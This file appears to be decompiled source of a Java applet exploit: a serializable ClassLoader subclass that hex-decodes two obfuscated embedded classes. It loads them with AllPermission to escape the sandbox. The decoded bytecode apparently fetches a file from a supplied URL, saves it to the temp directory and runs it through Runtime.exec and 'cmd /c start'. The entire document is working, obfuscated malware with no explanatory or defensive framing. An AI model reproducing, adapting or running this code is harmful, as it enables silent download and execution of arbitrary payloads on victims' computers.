import java.util.regex.Pattern;
import java.lang.reflect.Field;
import java.security.PermissionCollection;
import java.security.CodeSource;
import java.security.ProtectionDomain;
import java.security.Permission;
import java.security.AllPermission;
import java.security.Permissions;
import java.io.ObjectInputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.Serializable;

// 
// Decompiled by Procyon v0.5.30
// 

public class ________vload extends ClassLoader implements Serializable
{
    private static final long serialVersionUID;
    public static ________vload instance;
    public String tx;
    
    public ________vload() {
        this.tx = "vvv";
    }
    
    private void writeObject(final ObjectOutputStream objectOutputStream) throws IOException, ClassNotFoundException {
        objectOutputStream.defaultWriteObject();
    }
    
    private void readObject(final ObjectInputStream objectInputStream) throws IOException, ClassNotFoundException {
        ________vload.instance = this;
        objectInputStream.defaultReadObject();
    }
    
    public void main(final String s, final String s2) throws IOException {
        try {
            final byte[] hb = HB("CAFEBABE0000002E00450A001400240900130025090013002609001300270700280700290A0006002A0A0005002B07002C07002D0A000A002E0A0009002F0A000500300A000900310A000900320700330A000500340A0009003407003607003901000269730100154C6A6176612F696F2F496E70757453747265616D3B0100026F730100164C6A6176612F696F2F4F757470757453747265616D3B0100067468697324300100084C766C6F63616C3B01000953796E7468657469630100063C696E69743E010036284C766C6F63616C3B4C6A6176612F696F2F496E70757453747265616D3B4C6A6176612F696F2F4F757470757453747265616D3B2956010004436F646501000F4C696E654E756D6265725461626C6501000372756E01000328295601000A536F7572636546696C6501000B766C6F63616C2E6A6176610C001C00210C0019001A0C001500160C001700180100166A6176612F696F2F42756666657265645265616465720100196A6176612F696F2F496E70757453747265616D5265616465720C001C003A0C001C003B0100166A6176612F696F2F427566666572656457726974657201001A6A6176612F696F2F4F757470757453747265616D5772697465720C001C003C0C001C003D0C003E003F0C004000410C004200210100136A6176612F6C616E672F457863657074696F6E0C00430021070044010009766C6F63616C247363010002736301000C496E6E6572436C61737365730100106A6176612F6C616E672F546872656164010018284C6A6176612F696F2F496E70757453747265616D3B2956010013284C6A6176612F696F2F5265616465723B2956010019284C6A6176612F696F2F4F757470757453747265616D3B2956010013284C6A6176612F696F2F5772697465723B295601000472656164010007285B43494929490100057772697465010007285B4349492956010005666C757368010005636C6F7365010006766C6F63616C002000130014000000030000001500160000000000170018000000120019001A0001001B0000000000020000001C001D0001001E0000003800020004000000142AB700012A2BB500022A2CB500032A2DB50004B100000001001F0000001200040000001300090014000E0015001300160001002000210001001E000000BE0005000500000066014C014DBB000559BB0006592AB40003B70007B700084CBB000959BB000A592AB40004B7000BB7000C4D112000BC054E2B2D032DBEB6000D5936049E00122C2D031504B6000E2CB6000FA7FFE6A700044E2BC600072BB600112CC600072CB60012A700044EB100020004004D0050001000510061006400100001001F00000036000D0000001A0002001B0004001D0017001E002A001F00300021003E002200460023004D00250051002700590028006100290065002A0002002200000002002300380000000A00010013003500370000");
            final byte[] hb2 = HB("CAFEBABE0000002E00D7090044005C08005D0A002B005E07005F0A000400600800610A004400620A000400630A000400640A006500660A0065006709004400680800690A006A006B0A006C006D0440C0000008006E08006F0800700700710800720A001400730A001400740A001400750800760A001400770800780A002B00790A002B007A0A002B007B08007C07007D0A0020007E0A0020007F0800800800810A008200830700840700850A008200860A002700870A002600880700890A002B00600A0026008A07008B0A002E007E0A0044008C0A002E008D08008E0A0026008F0A002E008F0800900800910800920800930A006500940700950700960A004500600A009700980800990A002B009A0A0004009B0A009C009D0A009C009E090044009F0700A00700A10700A20700A3010002736301000C496E6E6572436C617373657301000573646174610100124C6A6176612F6C616E672F537472696E673B010005736C696E6B0100057374656D7001000372756E01001428294C6A6176612F6C616E672F4F626A6563743B010004436F646501000F4C696E654E756D6265725461626C6501000A457863657074696F6E730100063C696E69743E0100032829560100024842010016284C6A6176612F6C616E672F537472696E673B295B420100024853010026284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F537472696E673B0100083C636C696E69743E01000A536F7572636546696C6501000B766C6F63616C2E6A6176610C004C004B010007687474703A2F2F0C00A400A50100166A6176612F6C616E672F537472696E674275666665720C0053005401000C3644373336383734363132300C005700580C00A600A70C00A800A90700AA0C00AB00AC0C00AD00AE0C004A004B01000A6F732E76657273696F6E0700AF0C00B000580700B10C00B200B30100042E746D70010008324536353738363501000E6A6176612E696F2E746D706469720100196A6176612F7574696C2F537472696E67546F6B656E697A65720100013B0C005300B40C00B500B60C00B700A90100012C0C00B800B90100012F0C00BA00A50C00BB00B90C00BC00BD0100012E01000C6A6176612F6E65742F55524C0C005300BE0C00BF00C00100075265717565737401000A6A765F6D736A767365720700C10C00C200B40100166A6176612F696F2F42756666657265645265616465720100196A6176612F696F2F496E70757453747265616D5265616465720C00C300C40C005300C50C005300C60100106A6176612F6C616E672F537472696E670C00C700A90100186A6176612F696F2F46696C654F757470757453747265616D0C005500560C00C800C90100000C00CA005401000636333644363401000C202F632073746172742022220100022022010001220C00AD00CB0100136A6176612F6C616E672F5468726F7761626C650100136A6176612F6C616E672F457863657074696F6E0700CC0C00CD00CE01000230780C00CF00D00C00A600D10700D20C00D300D40C00D500D60C004D004B010006766C6F63616C0100106A6176612F6C616E672F4F626A6563740100276A6176612F73656375726974792F50726976696C65676564457863657074696F6E416374696F6E010009766C6F63616C247363010007696E6465784F66010015284C6A6176612F6C616E672F537472696E673B2949010006617070656E6401002C284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F537472696E674275666665723B010008746F537472696E6701001428294C6A6176612F6C616E672F537472696E673B0100116A6176612F6C616E672F52756E74696D6501000A67657452756E74696D6501001528294C6A6176612F6C616E672F52756E74696D653B01000465786563010027284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F50726F636573733B0100106A6176612F6C616E672F53797374656D01000B67657450726F706572747901000F6A6176612F6C616E672F466C6F617401000A7061727365466C6F6174010015284C6A6176612F6C616E672F537472696E673B2946010027284C6A6176612F6C616E672F537472696E673B4C6A6176612F6C616E672F537472696E673B295601000D6861734D6F7265546F6B656E7301000328295A0100096E657874546F6B656E01000B636F756E74546F6B656E7301000328294901000B6C617374496E6465784F660100066C656E677468010009737562737472696E67010016284949294C6A6176612F6C616E672F537472696E673B010015284C6A6176612F6C616E672F537472696E673B295601000E6F70656E436F6E6E656374696F6E01001A28294C6A6176612F6E65742F55524C436F6E6E656374696F6E3B0100166A6176612F6E65742F55524C436F6E6E656374696F6E0100127365745265717565737450726F706572747901000E676574496E70757453747265616D01001728294C6A6176612F696F2F496E70757453747265616D3B010018284C6A6176612F696F2F496E70757453747265616D3B2956010013284C6A6176612F696F2F5265616465723B2956010008726561644C696E650100057772697465010005285B422956010005636C6F7365010028285B4C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F50726F636573733B01001E6A6176612F73656375726974792F416363657373436F6E74726F6C6C657201000C646F50726976696C6567656401003D284C6A6176612F73656375726974792F50726976696C65676564457863657074696F6E416374696F6E3B294C6A6176612F6C616E672F4F626A6563743B0100066368617241740100042849294301001B2843294C6A6176612F6C616E672F537472696E674275666665723B0100116A6176612F6C616E672F496E74656765720100066465636F6465010027284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F496E74656765723B0100096279746556616C75650100032829420021004400450001004600030009004A004B00000009004C004B00000009004D004B000000050001004E004F000200500000026C00050011000001B8B200011202B60003029F0024BB000459B700051206B80007B60008B20001B60008B600094CB8000A2BB6000B4DB2000C1202B60003029F017C120DB8000EB8000F44231210969C00081211A700081212B800074D1213B8000E4EBB001459B2000C1215B700163A041904B600179901451904B600183A05BB00145919051219B700163A061906B6001A05A000141906B600183A071906B600183A08A7001F1906B600183A0719071907121BB6001C04601907B6001DB6001E3A081908121FB6000302A00018BB000459B700051908B600082CB60008B600093A08BB000459B700052DB600081908B60008B600093A09BB0020591907B700213A0A190AB600223A0B190B12231224B60025BB002659BB002759190BB60028B70029B7002A3A0CBB002B59B7002C3A0D013A0E190CB6002D593A0EC6001CBB000459B70005190DB60008190EB60008B600093A0DA7FFDFBB002E591909B7002F3A0F190F190DB80030B6003112323A0D190CB60033190FB6003406BD002B59031235B800075359041236535905BB000459B700051237B600081909B600081238B60008B60009533A10B8000A1910B6003957A7FEBE3A06A7FEB9A700044C01B00002007701AA01AD003A000001B201B5003B0001005100000092002400000034000C003500250036002D00390039003B0042003C0054003D005A003F00680040007000410077004400840047008D004800940049009E004B00A5004C00BA004F00DA005000EF005300FA005401010055010A0056011F005801280059012B005B0136005C014F005F015A00600164006101680063016D00640172006601A1006701AA006901B2007001B600710052000000040001003B000100530054000100500000003A000100020000000E2AB7003C2AB8003D57A700044CB1000100040009000C003B00010051000000120004000000760004007800090079000D007A000900550056000100500000006F00060003000000472AB6001D056CBC084C033D1C2AB6001DA200352B1C056CBB000459B70005123EB600082A1CB6003FB600402A1C0460B6003FB60040B60009B80041B6004254840202A7FFC92BB00000000100510000001600050000007E0009007F00130080003F007F00450082000900570058000100500000007C0005000300000054BB002B59B7002C4C033D1C2AB6001DA20043BB000459B700052BB60008BB000459B70005123EB600082A1CB6003FB600402A1C0460B6003FB60040B60009B80041B6004292B60040B600094C840202A7FFBB2BB0000000010051000000160005000000860008008700120088004C00870052008A000800590054000100500000002D000100000000000D01B3000C01B3000101B30043B10000000100510000000E00030000008F00040090000800910002005A00000002005B00490000000A00010047004400480000");
            final Permissions permissions = new Permissions();
            permissions.add(new AllPermission());
            final ProtectionDomain protectionDomain = new ProtectionDomain(null, permissions);
            this.defineClass(HS("V76V6C6F63616C24V7363"), hb, 0, hb.length, protectionDomain);
            final Class<?> defineClass = this.defineClass(HS("V76V6C6FV6361V6C"), hb2, 0, hb2.length, protectionDomain);
            if (defineClass != null) {
                final Field field = defineClass.getField(HS("V7364V617461"));
                final Field field2 = defineClass.getField(HS("V736CV696E6B"));
                final Object instance = defineClass.newInstance();
                field.set(instance, s);
                field2.set(instance, s2);
                defineClass.newInstance();
            }
        }
        catch (Exception ex) {}
    }
    
    public static String HS(String hc) {
        hc = HC(hc);
        String string = new String();
        for (int i = 0; i < hc.length(); i += 2) {
            string += (char)((Character.digit(hc.charAt(i), 16) << 4) + Character.digit(hc.charAt(i + 1), 16));
        }
        return string;
    }
    
    public static byte[] HB(String hc) {
        hc = HC(hc);
        final byte[] array = new byte[hc.length() / 2];
        for (int i = 0; i < hc.length(); i += 2) {
            array[i / 2] = (byte)((Character.digit(hc.charAt(i), 16) << 4) + Character.digit(hc.charAt(i + 1), 16));
        }
        return array;
    }
    
    public static long HL(String hc) {
        hc = HC(hc);
        return Long.parseLong(hc, 16);
    }
    
    public static String HC(final String s) {
        final String s2 = new String();
        return Pattern.compile("[G-Z]").matcher(s).replaceAll("");
    }
    
    static {
        serialVersionUID = HL("V5EV8JB4C67VDDC409D8");
        ________vload.instance = null;
    }
}